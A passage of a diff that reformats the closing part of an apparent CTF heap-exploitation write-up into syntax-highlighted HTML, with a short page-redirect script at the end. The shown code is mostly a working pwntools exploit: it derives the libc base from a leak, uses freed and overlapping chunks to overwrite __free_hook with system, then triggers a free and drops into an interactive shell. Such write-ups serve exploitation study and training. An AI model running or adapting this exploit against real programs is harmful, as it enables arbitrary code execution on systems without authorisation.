+<span style="color: #839496">libc</span><span style="color: #586e75">.</span><span style="color: #839496">address</span> <span style="color: #586e75">=</span> <span style="color: #839496">leak</span> <span style="color: #586e75">-</span> <span style="color: #2aa198">0x1ebbe0</span>
 
-print("Libc = " + str(hex(libc.address)))
+<span style="color: #268bd2">print</span><span style="color: #839496">(</span><span style="color: #2aa198">"Libc = "</span> <span style="color: #586e75">+</span> <span style="color: #268bd2">str</span><span style="color: #839496">(</span><span style="color: #268bd2">hex</span><span style="color: #839496">(libc</span><span style="color: #586e75">.</span><span style="color: #839496">address)))</span>
 
-#==========================Exploit=============================#
+<span style="color: #586e75; font-style: italic">#==========================Exploit=============================#</span>
 
-free(chunk_C)
-free(chunk_D)
-free(chunk_B+0x10)
+<span style="color: #839496">free(chunk_C)</span>
+<span style="color: #839496">free(chunk_D)</span>
+<span style="color: #839496">free(chunk_B</span><span style="color: #586e75">+</span><span style="color: #2aa198">0x10</span><span style="color: #839496">)</span>
 
-create(134,b'C'*39 + p64(0x41) + p64(0)*7 + p64(0x41) + p64(libc.sym.__free_hook-1))
+<span style="color: #839496">create(</span><span style="color: #2aa198">134</span><span style="color: #839496">,</span><span style="color: #2aa198">b'C'</span><span style="color: #586e75">*</span><span style="color: #2aa198">39</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x41</span><span style="color: #839496">)</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0</span><span style="color: #839496">)</span><span style="color: #586e75">*</span><span style="color: #2aa198">7</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x41</span><span style="color: #839496">)</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(libc</span><span style="color: #586e75">.</span><span style="color: #839496">sym</span><span style="color: #586e75">.</span><span style="color: #839496">__free_hook</span><span style="color: #586e75">-</span><span style="color: #2aa198">1</span><span style="color: #839496">))</span>
 
-create(40,b'X'*8)
-create(40,p64(libc.sym.system))
+<span style="color: #839496">create(</span><span style="color: #2aa198">40</span><span style="color: #839496">,</span><span style="color: #2aa198">b'X'</span><span style="color: #586e75">*</span><span style="color: #2aa198">8</span><span style="color: #839496">)</span>
+<span style="color: #839496">create(</span><span style="color: #2aa198">40</span><span style="color: #839496">,p64(libc</span><span style="color: #586e75">.</span><span style="color: #839496">sym</span><span style="color: #586e75">.</span><span style="color: #839496">system))</span>
 
-free(chunk_E+1)
+<span style="color: #839496">free(chunk_E</span><span style="color: #586e75">+</span><span style="color: #2aa198">1</span><span style="color: #839496">)</span>
 
-p.interactive()
-        </code>
-    </pre>
-</div>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">interactive()</span>
+</pre></div>
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
